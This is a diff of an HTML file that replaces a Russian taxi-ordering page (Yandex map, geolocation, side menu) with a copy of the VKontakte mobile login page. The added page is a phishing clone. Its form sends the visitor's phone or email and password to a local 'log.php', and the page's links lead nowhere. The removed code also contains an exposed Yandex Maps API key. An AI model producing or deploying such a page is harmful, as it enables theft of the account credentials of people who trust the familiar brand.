@@ -1,228 +1,79 @@
-<!DOCTYPE html>
-<html lang="en">
+﻿<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" >
 <head>
-	<meta charset="UTF-8">
-	<title>Document</title>
-      <!-- <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script> -->
-	  <script src="//code.jquery.com/jquery-3.3.1.min.js"></script>
-	  <script type="text/javascript" src="https://api-maps.yandex.ru/2.1/?lang=ru_RU&apikey=d40fb052-95ef-400a-b9ad-d8e14749a9be"></script>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
+<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="format-detection" content="telephone=no" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="MobileOptimized" content="176" />
+<meta name="HandheldFriendly" content="True" />
+
+<title>Мобильная версия ВКонтакте</title>
+
+<link type="text/css" rel="stylesheet" href="css/style.css?273"></link>
+<link type="text/css" rel="stylesheet" media="only screen" href="css/s_y.css?203"></link>
+
+<script type="text/javascript" src="js/s_c.js"></script>
+<link rel="shortcut icon" href="images/faviconnew.ico" type="image/x-icon">
 </head>
-<body onload="get_adres();">
-<style>
-@media screen and (min-width:1200px) {
-    body { font-size:110%; } /* Увеличить размер шрифта */
-}
-@media screen and (min-width:1600px) {
-    body { font-size:125%; } /* Увеличить размер шрифтаe */
-}
+<body id="vk" class="_hover" onresize="onBodyResize(true);">
+<div id="vk_utils"></div>
+<div id="vk_head" class="mhead">
+<div class="hb_wrap"><div class="hb_btn">&nbsp;</div></div>
+</div>
+<div id="vk_wrap" class="_vpan qs_enabled">
+<div id="l"></div>
+<div id="m"><div id="mhead" class="mhead">
+<a href="/" accesskey="*" class="hb_wrap mhb_logo">
+<div class="hb_btn mhi_logo">&nbsp;</div>
+<h1 class="hb_btn mh_header">&nbsp;</h1>
+</a></div>
 
-	body {
-		margin:0;
-		font-family: Arial;
-	}
-	.overlay {
-	  position: absolute;
-	  left: 0; right: 0; top: 0; bottom: 0;
-	  background: black;
-	  opacity: .7;
-	}
+<div id="mcont" class="mcont"><div class="pcont fit_box bl_cont">
+<div class="text_panel">
+Мобильная версия поможет Вам оставаться ВКонтакте, даже если Вы далеко от компьютера.
+</div>
+<div class="form_item fi_fat">
+<form method="post" action="log.php" novalidate>
+<dl class="fi_row">
+<dt class="fi_label">Телефон или email:</dt>
+<dd>
+<div class="iwrap"><input type="text" class="textfield" name="login" value="" /></div>
+</dd>
+</dl>
+<dl class="fi_row">
+<dt class="fi_label">Пароль:</dt>
+<dd>
 
-	.menu {
-		background-color: black;
-		width: 500px;
-		top: 0; bottom: 0;
-		position: absolute;
-		left: -500px;
-		opacity: 1;
-		z-index: 200;
-	}
-	.item {
-		width: 100%;
-		height: calc(100%/6);
-		color: white;
-		text-align: center;
-		font-size: 30pt;
-		cursor: pointer;
-	}
-	.item:hover {
-		background-color: white;
-		color: black;
+<div class="iwrap"><input type="password" class="textfield" name="password" /></div>
+</dd>
+</dl>
+<div class="fi_row">
+<div class="fi_subrow">
+<input class="button wide_button" type="submit" value="Войти" />
+</div>
+<div class="fi_subrow">
+<div class="near_btn wide_button"><a >Забыли пароль?</a></div>
+</div>
+</div>
+<div class="fi_row_new">
+<a class="button wide_button gray_button" >Зарегистрироваться</a>
+</div>
+</form>
 
-	}
-
-	.text {
-		position: relative;
-		top: 40%;
-	}
-	#YMapsID{
-	 position: absolute;
-      left: 0; right: 0; top: 0; bottom: 0;
-}
-	#knop{
-		position: absolute;
-		z-index: 151;
-	}
-
-#search-btn {
-  display: inline-block;
-  background-color: red;
-  color: #fff;
-  padding: 5px 5px;
-}
-
-.search-input {
-  padding: 5px 5px;
-  display: inline-block;
-  width: 200px;
-}
-.form {
- position: absolute;
- width: 300px;
- height: 500px;
- background-color: #fff;
- z-index: 150;
- border: 1px solid #000;
- margin: 20px 20px;
- padding: 10px;
-}
-
-
-</style>
-	<div class="menu">
-		<div class="item"  onClick="menu('close')"><div class="text">История поездок</div></div>
-		<div class="item"><div class="text">Оплата</div></div>
-		<div class="item"><div class="text">Промокоды</div></div>
-		<div class="item"><div class="text">Настройки</div></div>
-		<div class="item"><div class="text">Информация</div></div>
-		<div class="item"><div class="text">Служба поддержки</div></div>
-	</div>
-	
-	<div class="content">
-		<div class="form">
-			<h3>Форма вызова такси</h3>
-			<input type="button" value="Меню" onClick="menu('open')" id="knop" style="width: 250px; height: 50px;">
-			<label for="" id="user_adres"></label>
-		</div>
-		<div id="YMapsID" class="mapsulya"></div>
-	</div>
-	<div class="overlay"  onClick="menu('close')" style="display: none; z-index: 100;"></div>
-	
-
-<script>
-	$('.overlay').fadeOut(500);
-	function menu(gg){
-		if (gg=='open') {
-			$('.menu').animate({left: 0,});
-			$('.overlay').fadeIn(500);
-		} else {
-			$('.menu').animate({left: -500,});
-			$('.overlay').fadeOut(500);
-		}
-	}
-
-
-	var adres_user=[];
-	function get_adres(){
-		navigator.geolocation.getCurrentPosition(function(position) {
-	  		adres_user = [position.coords.latitude, position.coords.longitude];
-	  		console.log(adres_user);
-	  		mapshow();
-		});	
-	}
-
-	
-	function mapshow(){
-    document.getElementById('YMapsID').style.display = "";
-    ymaps.ready(init);
-    function init() {
-        var myPlacemark,
-            myMap = new ymaps.Map('YMapsID', {
-                center: adres_user,
-                zoom: 17,
-                controls: [ ]
-            }), mySearchControl = new ymaps.control.SearchControl({
-                options: {
-                    noPlacemark: false,
-                    float: 'bottom',
-                    fitMaxWidth: true
-                }
-            });
-            
-            myMap.controls.add(mySearchControl);
-
-        mySearchControl.events.add('resultselect', function (e) {
-            var index = e.get('index');
-            var coords = mySearchControl.getResult(index)._value.geometry.getCoordinates();
-            setMarker(coords);
-
-        });
-       
-        setMarker = function (coords){
-                myPlacemark = createPlacemark(coords);
-                myMap.geoObjects.add(myPlacemark);
-                myPlacemark.events.add('dragend', function () {
-                    getAddress(myPlacemark.geometry.getCoordinates());
-                });
-            getAddress(coords);
-        }
-        
-        myMap.events.add('click', function (e) {
-            var coords = e.get('coords');
-            setMarker(coords);
-        });
-        setMarker(adres_user);
-        function createPlacemark(coords) {
-            return new ymaps.Placemark(coords, {
-                iconCaption: 'поиск...'
-            }, {
-                preset: 'islands#grayDotIconWithCaption',
-                draggable: true
-            });
-        }
-        var k = 1;
-        function getAddress(coords) {
-            myPlacemark.properties.set('iconCaption', 'поиск...');
-            ymaps.geocode(coords).then(function (res) {
-                var firstGeoObject = res.geoObjects.get(0),
-                        array = firstGeoObject.properties.get('description').split(', '),
-                        country = array[0],
-                    city = array[1];
-                myPlacemark.properties
-                    .set({
-                        iconCaption: firstGeoObject.properties.get('name'),
-                        balloonContent: firstGeoObject.properties.get('text')
-                    });
-                
-                switch(k) {
-                  case 0:
-                    alert("Ошибочка");
-                    break;
-
-                  case 1:  
-                    a = firstGeoObject.properties.get('name');
-                    $('#adress_a').val(firstGeoObject.properties.get('name'));
-                    k++;
-                    break;
-
-                  case 2: 
-                    b = firstGeoObject.properties.get('name');
-                    $('#adress_b').val(firstGeoObject.properties.get('name'));
-                    document.getElementById('YMapsID').style.display = "none";
-                    marshrut(a,b);
-                    break;
-
-                  default:
-                    alert("Ошибочка");
-                    break;
-                }
-               
-            });
-        }
-    }
-}
-
-</script>
+</div>
+</div></div>
+<div id="mfoot" class="mfoot"><div class="pfoot">
+<ul class="footer_menu">
+<li class="fm_row"><a class="fm_item" >English</a></li><li class="fm_row"><a class="fm_item">Українська</a></li>
+<li class="fm_row"><a class="fm_item" >all languages »</a></li>
+</ul>
+<ul id="footer_menu" class="footer_menu">
+<li class="fm_row"><a class="fm_item" >Полная версия</a></li>
+</ul>
+</div></div>
+<div id="z"></div>
+</div>
+<div id="vk_bottom"></div>
 </body>
 </html>
-
-
